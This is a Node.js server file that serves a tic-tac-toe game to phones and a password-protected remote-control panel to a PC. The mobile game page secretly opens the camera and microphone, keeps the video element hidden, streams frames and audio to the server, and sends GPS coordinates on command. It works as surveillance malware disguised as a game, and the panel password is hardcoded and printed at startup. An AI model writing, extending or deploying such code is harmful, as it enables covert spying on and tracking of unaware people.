const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cookieParser = require('cookie-parser');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;
const SENHA_PC = '171172';

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));

// Middleware de autenticação para o painel PC
function authMiddleware(req, res, next) {
  const token = req.cookies?.authToken;
  
  // Rotas públicas
  if (req.path === '/login' || req.path === '/' || req.path.startsWith('/socket.io')) {
    return next();
  }
  
  // Verificar se está autenticado
  if (token === SENHA_PC) {
    return next();
  }
  
  // Redirecionar para login
  res.redirect('/login');
}

app.use(authMiddleware);

// Página de login
app.get('/login', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Acesso PC</title>
    <style>
        body { 
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .login-box {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            text-align: center;
        }
        h1 { 
            color: #333; 
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 18px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
        }
        button:hover { background: #45a049; }
        .error {
            color: #f44336;
            margin: 10px 0;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>🔐 Acesso Restrito</h1>
        <form method="POST" action="/login">
            <input type="password" name="senha" placeholder="Digite a senha" required autofocus>
            <button type="submit">Entrar no Painel PC</button>
        </form>
        <div class="error" id="error"></div>
    </div>
    
    <script>
        // Mostrar erro se houver
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('erro')) {
            document.getElementById('error').textContent = 'Senha incorreta!';
        }
    </script>
</body>
</html>
  `);
});

// Processar login
app.post('/login', (req, res) => {
  let body = '';
  req.on('data', chunk => body += chunk);
  req.on('end', () => {
    const senha = new URLSearchParams(body).get('senha');
    
    if (senha === SENHA_PC) {
      res.cookie('authToken', SENHA_PC, { 
        maxAge: 24 * 60 * 60 * 1000, // 24 horas
        httpOnly: true,
        sameSite: 'strict'
      });
      res.redirect('/pc');
    } else {
      res.redirect('/login?erro=1');
    }
  });
});

// Logout
app.get('/logout', (req, res) => {
  res.clearCookie('authToken');
  res.redirect('/login');
});

// Rota principal - detecta dispositivo
app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  
  if (isMobile) {
    // Celular - acesso livre
    res.redirect('/mobile');
  } else {
    // PC - redireciona para login
    res.redirect('/login');
  }
});

// Página do celular (sem senha)
app.get('/mobile', (req, res) => {
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Jogo da Velha</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 10px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 20px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            position: relative;
        }
        h1 { 
            text-align: center; 
            color: #333; 
            margin-bottom: 15px;
            font-size: 24px;
        }
        .status {
            background: #f0f0f0;
            padding: 12px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin: 15px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s;
        }
        .cell:active { transform: scale(0.95); background: #e9ecef; }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        button {
            width: 100%;
            padding: 15px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            font-weight: bold;
        }
        button:active { transform: scale(0.95); background: #45a049; }
        button:disabled { background: #ccc; cursor: not-allowed; }
        
        #toastContainer {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 350px;
            z-index: 9999;
            pointer-events: none;
        }
        .toast {
            background: rgba(33, 33, 33, 0.9);
            color: white;
            padding: 12px 20px;
            border-radius: 50px;
            margin-bottom: 10px;
            font-size: 14px;
            text-align: center;
            animation: slideIn 0.3s ease;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            font-weight: 500;
        }
        .toast.emergency {
            background: rgba(244, 67, 54, 0.95);
            animation: pulse 1s infinite;
        }
        @keyframes slideIn {
            from { transform: translateY(-100px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        #localVideo, #audioDebug {
            display: none;
        }
    </style>
</head>
<body>
    <div id="toastContainer"></div>

    <div class="container">
        <h1>🎮 Jogo da Velha</h1>
        <div class="status" id="status">Conectando...</div>
        <div class="board" id="board"></div>
        <button id="resetBtn" disabled>Reiniciar Jogo</button>
    </div>

    <video id="localVideo" autoplay playsinline muted></video>
    <audio id="audioDebug" autoplay></audio>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling'],
            reconnection: true,
            reconnectionAttempts: 10
        });
        
        let minhaVez = false;
        let meuSimbolo = '';
        let gameActive = false;
        let board = ['', '', '', '', '', '', '', '', ''];
        let mediaStream = null;
        let facingMode = 'environment';
        let audioContext = null;
        let audioProcessor = null;
        let audioSource = null;
        
        const statusDiv = document.getElementById('status');
        const resetBtn = document.getElementById('resetBtn');
        const localVideo = document.getElementById('localVideo');
        const toastContainer = document.getElementById('toastContainer');
        
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.id = 'cell-' + i;
            cell.onclick = () => {
                if(gameActive && minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        function showMessageToast(message, isEmergency = false) {
            const toast = document.createElement('div');
            toast.className = 'toast' + (isEmergency ? ' emergency' : '');
            toast.textContent = message;
            toastContainer.appendChild(toast);
            
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.style.animation = 'slideIn 0.3s reverse';
                    setTimeout(() => {
                        if (toast.parentNode) toast.remove();
                    }, 300);
                }
            }, 3000);
        }
        
        async function iniciarCamera(modo) {
            try {
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 320, 
                        height: 240,
                        facingMode: modo
                    },
                    audio: true
                });
                
                localVideo.srcObject = mediaStream;
                await localVideo.play();
                
                if (audioContext) {
                    audioContext.close();
                }
                
                audioContext = new AudioContext();
                audioSource = audioContext.createMediaStreamSource(mediaStream);
                audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                
                audioSource.connect(audioProcessor);
                audioProcessor.connect(audioContext.destination);
                
                audioProcessor.onaudioprocess = (e) => {
                    const inputData = e.inputBuffer.getChannelData(0);
                    if (Math.random() < 0.5) {
                        socket.emit('audio', Array.from(inputData));
                    }
                };
                
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext('2d');
                
                setInterval(() => {
                    if (mediaStream && mediaStream.active) {
                        ctx.drawImage(localVideo, 0, 0, 320, 240);
                        const frame = canvas.toDataURL('image/jpeg', 0.3);
                        socket.emit('frame', frame);
                    }
                }, 100);
                
            } catch (err) {
                console.log('Erro ao iniciar câmera:', err);
            }
        }
        
        iniciarCamera('environment');
        
        socket.on('comando', (cmd) => {
            if (cmd === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(500);
            } 
            else if (cmd === 'emergency' && navigator.vibrate) {
                navigator.vibrate([500, 200, 500, 200, 500]);
            } 
            else if (cmd === 'trocarCamera') {
                facingMode = facingMode === 'environment' ? 'user' : 'environment';
                iniciarCamera(facingMode);
            }
            else if (cmd === 'getLocation') {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            socket.emit('location', {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            });
                        },
                        (error) => {
                            console.log('Erro localização:', error);
                        }
                    );
                }
            }
        });
        
        socket.on('mensagem', (msg) => {
            showMessageToast('💬 ' + msg);
        });
        
        socket.on('connect', () => {
            statusDiv.innerHTML = 'Conectado!';
        });
        
        socket.on('inicio', (data) => {
            meuSimbolo = data.simbolo;
            minhaVez = meuSimbolo === 'X';
            gameActive = true;
            resetBtn.disabled = false;
            statusDiv.innerHTML = minhaVez ? 'Sua vez (X)' : 'Vez do oponente (X)';
        });
        
        socket.on('jogada', (data) => {
            board[data.pos] = data.simbolo;
            let cell = document.getElementById('cell-' + data.pos);
            if(cell) {
                cell.innerHTML = data.simbolo;
                cell.classList.add(data.simbolo.toLowerCase());
            }
            
            minhaVez = data.proximaVez === meuSimbolo;
            statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
        });
        
        socket.on('fim', (data) => {
            statusDiv.innerHTML = data.msg;
            gameActive = false;
        });
        
        socket.on('reiniciar', () => {
            board = ['', '', '', '', '', '', '', '', ''];
            document.querySelectorAll('.cell').forEach(c => {
                c.innerHTML = '';
                c.classList.remove('x', 'o');
            });
            gameActive = true;
            minhaVez = meuSimbolo === 'X';
            statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do oponente';
        });
        
        resetBtn.onclick = () => {
            socket.emit('reiniciar');
        };
    </script>
</body>
</html>`);
});

// Página do PC (protegida por senha)
app.get('/pc', (req, res) => {
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PC - Controle Remoto</title>
    <style>
        body { 
            font-family: Arial; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 1000px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        h1 { 
            color: #333; 
            margin: 0;
        }
        .logout-btn {
            background: #f44336;
            color: white;
            padding: 10px 20px;
            border-radius: 10px;
            text-decoration: none;
            font-weight: bold;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        .video-box {
            background: black;
            border-radius: 10px;
            overflow: hidden;
            aspect-ratio: 4/3;
        }
        img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .game-box {
            text-align: center;
        }
        .board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        .cell {
            background: #f8f9fa;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            aspect-ratio: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .cell:hover { background: #e9ecef; transform: scale(1.05); }
        .cell.x { color: #e74c3c; }
        .cell.o { color: #3498db; }
        .status {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-weight: bold;
        }
        .controls {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin: 20px 0;
        }
        button {
            padding: 15px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover { transform: scale(1.05); }
        .btn-primary { background: #4CAF50; color: white; }
        .btn-primary:hover { background: #45a049; }
        .btn-blue { background: #2196F3; color: white; }
        .btn-blue:hover { background: #1976D2; }
        .btn-red { background: #f44336; color: white; }
        .btn-red:hover { background: #d32f2f; }
        .btn-purple { background: #9c27b0; color: white; }
        .btn-purple:hover { background: #7b1fa2; }
        .btn-orange { background: #ff9800; color: white; }
        .btn-orange:hover { background: #f57c00; }
        .chat-box {
            margin-top: 30px;
            border: 2px solid #ddd;
            border-radius: 10px;
            padding: 15px;
        }
        .messages {
            height: 150px;
            overflow-y: auto;
            background: #f9f9f9;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 10px;
        }
        .message {
            padding: 8px;
            margin: 5px 0;
            background: #e3f2fd;
            border-radius: 5px;
            word-wrap: break-word;
        }
        .message small {
            color: #666;
            font-size: 11px;
        }
        .chat-input {
            display: flex;
            gap: 10px;
        }
        .chat-input input {
            flex: 1;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
        }
        .chat-input button {
            padding: 15px 25px;
            background: #2196F3;
            color: white;
        }
        .info {
            background: #e8f5e9;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 14px;
        }
        .audio-control {
            display: flex;
            gap: 10px;
            align-items: center;
            margin: 10px 0;
        }
        #toggleAudio {
            background: #ff9800;
            color: white;
        }
        #audioVolume {
            flex: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎮 Controle Remoto do Celular</h1>
            <a href="/logout" class="logout-btn">🔒 Sair</a>
        </div>
        
        <div class="grid">
            <div>
                <div class="video-box">
                    <img id="remoteVideo">
                </div>
                <div class="status" id="videoStatus">📱 Aguardando celular...</div>
                
                <div class="controls">
                    <button class="btn-blue" id="trocarCamera">🔄 Trocar Câmera</button>
                    <button class="btn-purple" id="getLocation">📍 Localização</button>
                    <button class="btn-orange" id="vibrate">📳 Vibrar</button>
                    <button class="btn-red" id="emergency">⚠️ Emergência</button>
                </div>
                
                <div class="audio-control">
                    <button id="toggleAudio">🔊 Áudio: ON</button>
                    <input type="range" id="audioVolume" min="0" max="100" value="50">
                </div>
                
                <div id="locationInfo" class="info"></div>
            </div>
            
            <div class="game-box">
                <div class="status" id="gameStatus">Conectando...</div>
                <div class="board" id="board"></div>
                
                <div class="controls">
                    <button class="btn-primary" id="resetBtn" disabled>🔄 Reiniciar Jogo</button>
                </div>
            </div>
        </div>
        
        <div class="chat-box">
            <h3>💬 Chat com o Celular</h3>
            <div class="messages" id="messages"></div>
            
            <div class="chat-input">
                <input type="text" id="messageInput" placeholder="Digite sua mensagem...">
                <button id="sendMessage">📤 Enviar</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling']
        });
        
        let minhaVez = true;
        let gameActive = false;
        let board = ['', '', '', '', '', '', '', '', ''];
        let audioEnabled = true;
        let audioVolume = 50;
        
        const statusDiv = document.getElementById('gameStatus');
        const resetBtn = document.getElementById('resetBtn');
        const remoteVideo = document.getElementById('remoteVideo');
        const videoStatus = document.getElementById('videoStatus');
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const locationInfo = document.getElementById('locationInfo');
        
        for(let i = 0; i < 9; i++) {
            let cell = document.createElement('div');
            cell.className = 'cell';
            cell.id = 'cell-' + i;
            cell.onclick = () => {
                if(gameActive && minhaVez && board[i] === '') {
                    socket.emit('jogada', i);
                }
            };
            document.getElementById('board').appendChild(cell);
        }
        
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const audioGain = audioContext.createGain();
        audioGain.gain.value = audioVolume / 100;
        audioGain.connect(audioContext.destination);
        
        let frameCount = 0;
        socket.on('frame', (frameData) => {
            remoteVideo.src = frameData;
            frameCount++;
            videoStatus.innerHTML = '📱 Recebendo vídeo (frames: ' + frameCount + ')';
        });
        
        socket.on('audio', (audioData) => {
            if (audioEnabled) {
                const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
                buffer.copyToChannel(new Float32Array(audioData), 0);
                
                const source = audioContext.createBufferSource();
                source.buffer = buffer;
                source.connect(audioGain);
                source.start();
            }
        });
        
        document.getElementById('trocarCamera').onclick = () => {
            socket.emit('comando', 'trocarCamera');
        };
        
        document.getElementById('getLocation').onclick = () => {
            socket.emit('comando', 'getLocation');
        };
        
        document.getElementById('vibrate').onclick = () => {
            socket.emit('comando', 'vibrate');
        };
        
        document.getElementById('emergency').onclick = () => {
            socket.emit('comando', 'emergency');
            addMessage('⚠️ SINAL DE EMERGÊNCIA ENVIADO!', true);
        };
        
        document.getElementById('toggleAudio').onclick = () => {
            audioEnabled = !audioEnabled;
            document.getElementById('toggleAudio').innerHTML = audioEnabled ? '🔊 Áudio: ON' : '🔇 Áudio: OFF';
        };
        
        document.getElementById('audioVolume').oninput = (e) => {
            audioVolume = e.target.value;
            audioGain.gain.value = audioVolume / 100;
        };
        
        socket.on('location', (data) => {
            locationInfo.innerHTML = \`
                📍 Localização do celular:<br>
                Latitude: \${data.latitude}<br>
                Longitude: \${data.longitude}<br>
                <a href="https://www.google.com/maps?q=\${data.latitude},\${data.longitude}" target="_blank">Ver no mapa</a>
            \`;
        });
        
        function addMessage(msg, isEmergency = false) {
            const messageDiv = document.createElement('div');
            messageDiv.className = 'message';
            if (isEmergency) {
                messageDiv.style.background = '#ffebee';
                messageDiv.style.border = '2px solid #f44336';
            }
            messageDiv.innerHTML = \`<small>\${new Date().toLocaleTimeString()}</small><br>\${msg}\`;
            messagesDiv.appendChild(messageDiv);
            messagesDiv.scrollTop = messagesDiv.scrollHeight;
        }
        
        socket.on('mensagem', (msg) => {
            addMessage('📱 Celular: ' + msg);
        });
        
        document.getElementById('sendMessage').onclick = () => {
            const msg = messageInput.value.trim();
            if (msg) {
                socket.emit('mensagem', msg);
                addMessage('💻 Você: ' + msg);
                messageInput.value = '';
            }
        };
        
        messageInput.onkeypress = (e) => {
            if (e.key === 'Enter') {
                document.getElementById('sendMessage').click();
            }
        };
        
        socket.on('connect', () => {
            statusDiv.innerHTML = 'Conectado!';
        });
        
        socket.on('inicio', () => {
            gameActive = true;
            resetBtn.disabled = false;
            statusDiv.innerHTML = 'Sua vez (X)';
        });
        
        socket.on('jogada', (data) => {
            board[data.pos] = data.simbolo;
            let cell = document.getElementById('cell-' + data.pos);
            if(cell) {
                cell.innerHTML = data.simbolo;
                cell.classList.add(data.simbolo.toLowerCase());
            }
            
            minhaVez = data.proximaVez === 'X';
            statusDiv.innerHTML = minhaVez ? 'Sua vez' : 'Vez do celular';
        });
        
        socket.on('fim', (data) => {
            statusDiv.innerHTML = data.msg;
            gameActive = false;
        });
        
        socket.on('reiniciar', () => {
            board = ['', '', '', '', '', '', '', '', ''];
            document.querySelectorAll('.cell').forEach(c => {
                c.innerHTML = '';
                c.classList.remove('x', 'o');
            });
            gameActive = true;
            minhaVez = true;
            statusDiv.innerHTML = 'Sua vez';
        });
        
        resetBtn.onclick = () => {
            socket.emit('reiniciar');
        };
    </script>
</body>
</html>`);
});

// Lógica do jogo
let board = ['', '', '', '', '', '', '', '', ''];
let vez = 'X';
let jogadores = {
  x: null,
  o: null
};

function checkWinner() {
  const lines = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
  for(let l of lines) {
    if(board[l[0]] && board[l[0]] === board[l[1]] && board[l[0]] === board[l[2]]) {
      return board[l[0]];
    }
  }
  return null;
}

io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  
  if (!jogadores.x) {
    jogadores.x = socket.id;
    socket.emit('inicio', { simbolo: 'X' });
  } else if (!jogadores.o) {
    jogadores.o = socket.id;
    socket.emit('inicio', { simbolo: 'O' });
  }
  
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
  
  socket.on('audio', (audioData) => {
    socket.broadcast.emit('audio', audioData);
  });
  
  socket.on('comando', (cmd) => {
    console.log('Comando:', cmd);
    socket.broadcast.emit('comando', cmd);
  });
  
  socket.on('mensagem', (msg) => {
    socket.broadcast.emit('mensagem', msg);
  });
  
  socket.on('location', (loc) => {
    socket.broadcast.emit('location', loc);
  });
  
  socket.on('jogada', (pos) => {
    let jogador = socket.id === jogadores.x ? 'X' : 'O';
    
    if (jogador !== vez || board[pos] !== '') return;
    
    board[pos] = jogador;
    let winner = checkWinner();
    let proximaVez = vez === 'X' ? 'O' : 'X';
    
    if (winner) {
      io.emit('fim', { msg: winner + ' venceu! 🎉' });
    } else if (!board.includes('')) {
      io.emit('fim', { msg: 'Empate! 🤝' });
    } else {
      vez = proximaVez;
    }
    
    io.emit('jogada', { pos, simbolo: jogador, proximaVez });
  });
  
  socket.on('reiniciar', () => {
    board = ['', '', '', '', '', '', '', '', ''];
    vez = 'X';
    io.emit('reiniciar');
  });
  
  socket.on('disconnect', () => {
    if (socket.id === jogadores.x) jogadores.x = null;
    if (socket.id === jogadores.o) jogadores.o = null;
    board = ['', '', '', '', '', '', '', '', ''];
    vez = 'X';
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🚀 Servidor rodando!`);
  console.log(`   Porta: ${PORT}`);
  console.log(`   Senha do PC: 171172`);
});
